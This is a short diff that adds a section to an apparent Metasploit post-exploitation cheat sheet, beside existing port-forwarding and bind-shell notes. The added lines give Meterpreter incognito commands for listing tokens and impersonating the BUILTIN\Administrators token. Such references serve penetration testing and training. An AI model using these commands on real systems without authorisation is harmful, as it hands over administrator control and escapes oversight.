@@ -54,6 +54,13 @@ Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
 
 #### After setting routes use bind shells
 
+#### Metasploit imperssonate
+```
+Load incognito
+list_tokens -g
+impersonate_token "BUILTIN\Administrators"
+```
+
 ## Autorun script
 ### Set solo module as autorunscript
 ```
